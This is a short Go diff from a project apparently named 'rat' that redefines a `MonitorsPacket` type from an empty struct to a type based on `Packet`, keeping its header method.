@@ -5,8 +5,7 @@ import (
 	"rat/common"
 )
 
-type MonitorsPacket struct {
-}
+type MonitorsPacket Packet
 
 func (packet MonitorsPacket) GetHeader() common.PacketHeader {
 	return common.MonitorsHeader
